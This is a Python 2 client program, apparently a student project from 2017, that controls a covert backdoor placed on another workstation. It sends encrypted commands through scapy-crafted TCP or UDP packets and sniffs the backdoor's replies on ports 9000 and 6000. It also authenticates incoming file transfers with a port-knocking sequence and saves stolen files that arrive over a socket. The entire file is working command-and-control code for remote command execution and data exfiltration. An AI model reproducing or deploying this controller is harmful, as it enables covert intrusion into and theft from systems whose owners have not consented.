#  =================================================================
#  	SOURCE FILE: client.py
#  
#
#	DATE: Dec 4th 2017
#  
#  
#  	AUTHOR: Paul Cabanez, Justin Chau
#
#	
#	DESCRIPTION: Client program that works with backdoor.py
#		Connects with backdoor placed on a seperate workstation. Sends
#		commands to backdoor to gain information of the backdoor workstation.
#	
#
#	LAST REVISED: October 19th 2017
#  =================================================================

import time, base64, logging, encryption ,configReader, helpers, threading, datetime
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * #sudo apt-get install python-scapy
from subprocess import *
from Crypto.Cipher import AES
import ConfigParser
from multiprocessing import Process
from Tkinter import *

text = ""
results = ""
resultsForFiles = ""
fileIP = ""
state = 0

#  =================================================================
#  name: verify_root
#  @param:
#		none
#  @return
#  		none
#
#  description: verify if the program is ran in root if not exit the program
#  =================================================================
def verify_root():
	if(os.getuid() != 0):
			exit("This program is not in root/sudo")
					
#  =================================================================
#  name: sendCmd
#  @param:
#		destIP 	- destination IP that the packet will be sent to
#
#		port 	- destination port the packet will sent through
#
#		cmd		- the encrypted command to send
#
#  @return
#		none
#  
#  description: crafts packet using scapy
#  =================================================================
def sendCmd(data):
	
	#check if the protocol is TCP or UDP to craft proper packet
	if configReader.protocol == "tcp":
		packet = IP(dst=configReader.destIP)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encryption(configReader.password+data))
	if configReader.protocol == "udp":
		packet = IP(dst=configReader.destIP)/UDP(dport=8000, sport=7999)/Raw(load=encryption.encryption(configReader.password+data))
		
	print "Sent Command"
	send(packet, verbose=0)
	
#  =================================================================
#  name: recvCmd
#  @param:
#		packet 	- a packet received from back door with correct port 
#				in this case port 9000 for messages
#
#  @return
#		none
#  
#  description: receives packet from backdoor and decrypts data
#  =================================================================	
def recvCmd(packet):
	global results
	
	#check if the packet has IP layer
	if packet.haslayer(IP):
		
		#check if the packet has the same IP as the backdoor
		if packet[IP].src == configReader.destIP:
			
			#parse the packet and add them together
			dataReceived = helpers.parsePacket(packet)
			results += (dataReceived)
			print results
			
			#check packet for raw data
			if packet.haslayer(Raw):
				
				#if the data has the password at the end then execute decryption
				if packet[Raw].load == configReader.password:
					decryptedData = encryption.decryption(results)
					print decryptedData
					results = ""
					
#  =================================================================
#  name: recvFile
#  @param:
#		packet 	- a packet received from backdoor with correct port
#				in this case port 6000 for files
#  @return
#		none
#  
#  description: receives packet from backdoor and decrypts data
#		method also check knocking sequence before accepting the file
#  =================================================================						
def recvFile(packet):
	global resultsForFiles
	global state
	
	#check if the fileIP is accepted or the state is accepted
	#if they do not pass , check knock sequence 
	if packet[IP].src!= fileIP or state is not 3:
		print "\nChecking Knock Sequence"
		knock(packet)
		
	
	#check packet if has IP/Raw layer and also that authentication is passed
	if state is 3:
		
		time.sleep(3)
		#if the IP does not match the authenticated IP
		if packet[IP].src != fileIP:
			print "IP didn't match" + "source" + packet[IP].src + "fileIP" + fileIP
			return
			
		#check if the IP matches the backdoor IP
		#if packet[IP].src == configReader.destIP:
		
			#load the packet content
		#	resultsForFiles = packet[Raw].load
			
		#	if packet.haslayer(Raw):
				
		#		#if the load has the password embedded
		#		if packet[Raw].load.find(configReader.password):
		#			
		#			#remove the password to get the rest of the content
		#			resultsForFiles.strip(configReader.password)
		#			resultsForFiles = resultsForFiles[:-8]
		#			
		#			#debugging purposes
		#			print resultsForFiles
		#			
		#			#decrypt the contents and write the files
		#			decryptedData = encryption.decryption(resultsForFiles)
		#			fileName, fileData = decryptedData.split("\0",1)
		#			fileDescriptor = open(fileName, 'wb')
		#			fileDescriptor.write(fileData)
		#			resultsForFiles = ""
		
		recvPhoto()
		state = 0 #reset state for new knock
					
#  =================================================================
#  name: recvPhoto
#  @param:
#		none
#  @return
#		none
#  
#  description: opens a socket for file receival
#  =================================================================
def recvPhoto():
	
	s = socket.socket()     
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)        # Create a socket object
	
	#DEBUGGING METHOD HPST
	host = socket.gethostname()     # Get local machine name #FIX BEFORE EXECUTING DEBUGGING
	port = 60000                    # Reserve a port for your service.

	s.connect((host, port))
	s.send("Hello server!")

	now = datetime.now()
	
	with open(now.strftime("%Y-%m-%d %H:%M:%S"), 'wb') as f:
		print 'file opened'
		while True:
			print('receiving data...')
			data = s.recv(1024)
			print('data=%s', (data))
			if not data:
				break
			# write data to a file
			f.write(data)

	f.close()
	
	print('Successfully received file')
	s.close()
	print('Connection closed')
					
#  =================================================================
#  name: sniffFile
#  @param:
#		none
#
#  @return
#		none
#  
#  description: this method sniffs for packets directed to port 6000 for files
#  =================================================================						
def sniffFile():
	while True:
		sniff(filter='{0} and dst port 6000'.format(configReader.protocol), prn=recvFile, count=1)
		

#  =================================================================
#  name: sniffCmd
#  @param:
#		none
#
#  @return
#		none
#  
#  description: this method sniffs for packets directed to port 9000 for files
#  =================================================================		
def sniffCmd():
	while True:
		sniff(filter='{0} and dst port 9000'.format(configReader.protocol), count=1, prn=recvCmd)

	
		
#  =================================================================
#  name: knock
#  @param:
#		packet - the packet received by the backdoor
#
#  @return
#		none
#  
#  description: checks for knocking sequence of packet by keeping track
# 		of how many packets were in the correct sequence
#  =================================================================		
def knock(packet):
	global state
	global fileIP
	
	#check IP layer
	if IP in packet:
		#check if UDP is in the packet
		if UDP in packet:
			ip = packet[IP].src
			
			#start the knocking sequence
			if packet[UDP].sport == int(configReader.portknockArray[0]) and state == 0:
				state = 1
				print packet[IP].src + " First Sequence Knock"
			elif packet[UDP].sport == int(configReader.portknockArray[1]) and state == 1:
				state = 2
				print packet[IP].src + " Second Sequence Knock"
			elif packet[UDP].sport == int(configReader.portknockArray[2]) and state == 2:
				state = 3
				fileIP = packet[IP].src
				print packet[IP].src + " Third Sequence Knock"
				print "Connection Accepted"
			else:
				print "Wrong Port Knock Sequence"
				state = 0
						
		#check if TCP
		if TCP in packet:
			ip = packet[IP].src
			
			#start the knocking sequence
			if packet[TCP].sport == int(configReader.portknockArray[0]) and state == 0:
				state = 1
				print packet[IP].src + " First Sequence Knock"
			elif packet[TCP].sport == int(configReader.portknockArray[1]) and state == 1:
				state = 2
				print packet[IP].src + " Second Sequence Knock"
			elif packet[TCP].sport == int(configReader.portknockArray[2]) and state == 2:
				state = 3
				fileIP = packet[IP].src
				print packet[IP].src + " Third Sequence Knock"
				print "Connection Accepted"
			else:
				print "Wrong Port Knock Sequence"
				state = 0	


#  =================================================================
#  name: main
#  @param
#		none
#  @return
#		none
#  
#  description: main runner of the program
#  =================================================================
def main():
	global fileIP
	verify_root()

	
	#commented out for faster debugging
	#helpers.portKnock(configReader.destIP)

	#sniffing file process
	fileProcess = Process(target=sniffFile)
	fileProcess.daemon = True
	fileProcess.start()
	
	#sniffing for command process
	cmdProcess = Process(target=sniffCmd)
	cmdProcess.daemon = True
	cmdProcess.start()
	
	#sending commands to backdoor
	while True:
		cmd = raw_input("Command to execute: ")
		sendCmd(cmd)
		#sending = False
		
		#while 1:
		#	sniff(filter='{0} and dst port 9000'.format(configReader.protocol), count=1, prn=recvCmd)
		#	if sending == True:
		#		break
				
if __name__ == '__main__':
	try:
	   main()
	except KeyboardInterrupt:
			exit("Exiting....")
